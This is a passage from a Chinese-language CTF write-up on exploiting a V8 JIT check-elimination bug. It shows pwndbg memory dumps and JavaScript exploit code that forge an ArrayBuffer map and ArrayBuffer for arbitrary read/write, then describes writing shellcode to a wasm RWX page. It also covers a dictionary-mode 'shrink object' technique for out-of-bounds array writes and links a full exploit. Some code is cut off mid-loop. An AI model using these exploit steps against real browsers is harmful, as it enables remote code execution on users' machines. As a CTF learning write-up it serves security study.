    $2 = 6.7349004654127717e-316
    pwndbg>
需要注意的是伪造的map对象在后面的操作过程中由于触发GC，会被移动到`old
space`中，若是采用前面提到的数组形式来存放数据，在移动之后JSArray对象的`elements`字段与该对象起始地址的偏移是不固定的，这使得我们的漏洞利用具有不稳定性，所以用什么方法可以让对象起始地址和数据之间的偏移固定呢？可以利用对象的属性信息来存储我们的`fake
map`数据，我们知道对象内属性是直接存放在对象内部的，其相对于对象起始地址偏移固定为0x18。
所以最后存放`fake map`可以用这种形式：
        // fake arraybuffer map
        let fake_ab_map = {x1:-1.1263976280432204e+129,x2:2.8757499612354866e-188,x3:6.7349004654127717e-316,x4:-1.1263976280432204e+129,x5:-1.1263976280432204e+129,x6:0.0};
        fake_ab_map.x4 = mem.u2d(ab_proto_addr);
        fake_ab_map.x5 = mem.u2d(ab_construct_addr);
###  伪造ArrayBuffer
伪造出`ArrayBuffer
map`之后，伪造一个`ArrayBuffer`便比较简单了，只需要按照下面这种形式来伪造即可，前面的三个字段只需要用我们`fake
map`的地址来填写即可，后面的是`ArrayBuffer`的length和backing store。
    var fake_ab = [
        mem.u2d(ab_map_obj_addr), //我们fake的map地址
        mem.u2d(ab_map_obj_addr), //写死即可，这个数字应该无所谓
        mem.u2d(ab_map_obj_addr), //写死即可，这个数字应该无所谓
        3.4766779039175e-310, /* buffer length 0x4000*/
        3.477098183419809e-308,//backing store,先随便填一个数
        mem.u2d(0x8)
    ];
这里需要注意最后一个字段，在`34c3ctf v9`里面用`mem.u2d(4)`可以的，但是在这里它会报如下错误：
    TypeError: Cannot perform DataView.prototype.getFloat64 on a detached ArrayBuffer
        at DataView.getFloat64 ()
依据这个错误，翻了一下源码，发现通过`IsDetachedBuffer`来判断一个buffer是否是`Detached`，判断的方式就是`LoadJSArrayBufferBitField`加载JSArrayBuffer的`bit_filed`，`bit_filed`刚好就是我们`fake_ab`的最后一个字段，所以我尝试把它从0x4改成0x8，结果就没有报错了。
最后伪造的ArrayBuffer数据可以是这样：
        let fake_ab = {y1:mem.u2d(fake_ab_map_addr),y2:mem.u2d(fake_ab_map_addr),y3:mem.u2d(fake_ab_map_addr),y4:mem.u2d(0x2000000000),y5:mem.u2d(fake_ab_map_addr+0x20),y6:mem.u2d(0x8)};
        gc();
###  getshell
有了伪造的ArrayBuffer，再结合DataView，通过不断地修改`backing_store`也既`fake_ab.y5`即可实现任意地址读写。按照`wasm
func
addr(offset:0x18)`->`SharedFunctionInfo(offset:0x8)`->`WasmExportedFunctionData(offset:0x10)`->`data_instance(offset:0xc8)`->`imported_function_targets(offset:0)`->`rwx
addr`的顺序获取rwx的地址，写入shellcode即可。
[完整exp在这里](https://github.com/e3pem/CTF/blob/master/xnuca2019_jit/exp1.js)
## 漏洞利用 – Shrink object
###  基础知识
该漏洞利用技巧是从mem2019师傅[34C3 CTF
V9](https://mem2019.github.io/jekyll/update/2019/08/28/V8-Redundancy-Elimination.html)中学到的，从前面的分析我们知道了对象内(in-object)属性的存储方式，这种方式存储的是对象初始化时就有的属性，也就是我们所说的快速属性，然而还有一种存储属性的模式，就是`dictionary
mode`。在字典模式中属性的存储不同于`fast mode`，不是直接存放在距离对象偏移为0x18的位置处，而是重新开辟了一块空间来存放。
我们用下面这个例子来实际分析一下：
    function gc() { 
        for (var i = 0; i  job 0x758ca28fa29
    0x758ca28fa29: [JS_OBJECT_TYPE]
     - map: 0x23d4daa0cd91  [FastProperties]
     - prototype: 0x332bb06046d9 
     - elements: 0x0f84c5302cf1  [HOLEY_ELEMENTS]
     - properties: 0x0f84c5302cf1  {
        #a:  1.1 (data field 0)
        #b:  1.2 (data field 1)
        #c:  1.3 (data field 2)
        #d:  1.4 (data field 3)
        #e:  1.5 (data field 4)
     }
    pwndbg> x/10xg 0x758ca28fa28
    0x758ca28fa28:  0x000023d4daa0cd91      0x00000f84c5302cf1
    0x758ca28fa38:  0x00000f84c5302cf1      0x3ff199999999999a  job 0x758ca28fa29
    0x758ca28fa29: [JS_OBJECT_TYPE]
     - map: 0x23d4daa081f1  [DictionaryProperties]
     - prototype: 0x332bb06046d9 
     - elements: 0x0f84c5302cf1  [HOLEY_ELEMENTS]
     - properties: 0x0758ca28fc71  {
       #a: 0x0758ca28fe29  (data, dict_index: 1, attrs: [WEC])
       #e: 0x0758ca28fe69  (data, dict_index: 5, attrs: [WEC])
       #c: 0x0758ca28fe49  (data, dict_index: 3, attrs: [WEC])
       #b: 0x0758ca28fe39  (data, dict_index: 2, attrs: [WEC])
     }
    pwndbg> x/10xg 0x758ca28fa28
    0x758ca28fa28:  0x000023d4daa081f1      0x00000758ca28fc71
    0x758ca28fa38:  0x00000f84c5302cf1      0x00000f84c5302201
    0x758ca28fa48:  0x0000002800000000      0x3ff4cccccccccccd
    0x758ca28fa58:  0x3ff6666666666666      0x3ff8000000000000
    0x758ca28fa68:  0x00000f84c5302341      0x0000000500000000
    pwndbg> job 0x758ca28fa41
    free space, size 40
    pwndbg>
接下来调用gc函数，触发GC，对象obj由于在多次内存访问期间都存在，所以会被移至`old
space`，此时查看相对于obj偏移为0x18处的值，已经不是原来存放的`in-object`属性了，而是其他的一些被移动到`old space`的对象。
    pwndbg> job 0x2a376d0856f1
    0x2a376d0856f1: [JS_OBJECT_TYPE] in OldSpace
     - map: 0x23d4daa081f1  [DictionaryProperties]
     - prototype: 0x332bb06046d9 
     - elements: 0x0f84c5302cf1  [HOLEY_ELEMENTS]
     - properties: 0x2a376d08ddd1  {
       #a: 0x2a376d08e0e1  (data, dict_index: 1, attrs: [WEC])
       #e: 0x2a376d08e0f1  (data, dict_index: 5, attrs: [WEC])
       #c: 0x2a376d08e101  (data, dict_index: 3, attrs: [WEC])
       #b: 0x2a376d08e111  (data, dict_index: 2, attrs: [WEC])
     }
    pwndbg> x/10xg 0x2a376d0856f0
    0x2a376d0856f0: 0x000023d4daa081f1      0x00002a376d08ddd1
    0x2a376d085700: 0x00000f84c5302cf1      0x000023d4daa0cbb1
    0x2a376d085710: 0x00000f84c5302cf1      0x00000f84c5302cf1
    0x2a376d085720: 0x00002a376d08dcb9      0x00002a376d08dcf9
    0x2a376d085730: 0x00002a376d08dd41      0x00002a376d08dd89
    pwndbg> job 0x2a376d085709
    0x2a376d085709: [JS_OBJECT_TYPE] in OldSpace
     - map: 0x23d4daa0cbb1  [FastProperties]
     - prototype: 0x2a376d082291 
     - elements: 0x0f84c5302cf1  [HOLEY_ELEMENTS]
     - properties: 0x0f84c5302cf1  {
        #buf: 0x2a376d08dcb9  (data field 0)
        #f64: 0x2a376d08dcf9  (data field 1)
        #u32: 0x2a376d08dd41  (data field 2)
        #bytes: 0x2a376d08dd89  (data field 3)
     }
###  实际利用
现在回到这道题上，前面已经知道通过一些操作让对象属性从`fast mode`变成`dictionary
mode`，在通过多次内存操作触发GC，我们的对象将被移至`old space`，此时原来存放`in-object`属性的偏移0x18处起始的地方存放的是其他被移动到`old
space`的对象，相当于对象已经发生了`变化`，由于漏洞的存在，`CheckMaps`节点被消除，无法检测出对象的改变，仍然按照原来访问`in-object`的方式来读写对象数据，此时读写的就是其他对象中的数据了，也既越界读写。
将对象从`fast mode`转化为`dictionary mode`的方式目前知道的是：
  * victim _obj. __defineGetter__ (‘xx’,()=>2);
  * delete victim_obj[‘d’];
如果紧跟着obj后面的是我们申请的一个`JSArray`，那么越界修改数组的length字段是可以做到的，由此我们可以得到一个很大的数组越界，后续的利用就很简单了，查找Arraybuffer的`backing_store`相对于越界数组的下标便可做到任意地址读写。
现在的问题是如何让两个对象在移动至`old
space`之后还能紧挨着呢？经过多次尝试发现，在trigger_vul中会有对`victim_obj`的访问，若是我在`foo4vul`中不加入对`arr`的访问，那么这两个对象移动后相差的距离一定会很大，所以我猜测由于存在对`victim_obj`的访问，所以它会先被移动到`old
space`，后续的arr虽然也会移动，但是这之间已经有多个对象移动到`old
space`了，因此导致二者的偏移很大。而在`foo4vul`中加入`arr`的访问，果然两个对象的地址是紧挨着的，而且非常稳定！
_还有一个小问题：之前遇到了移动后`victim_obj`位于`arr`后面的情况，调换了一下`foo4vul`的参数顺序`a,b,o,arr->a,b,arr,o`即可。_
拿到越界数组的部分代码如下：
        let victim_obj = {x:1,y:2,z:3,l:4,a:5,b:6,c:7,d:8,e:9};
        let arr = [1.1,1.2,1.3,1.4,1.5,1.6];
        var OPT_NUM = 0x10000;
        function foo4vul(a,b,arr,o){
            for(let i=0;i2);
                    victim_obj.__defineGetter__('xx',()=>2);
                    for (var i = 0; i 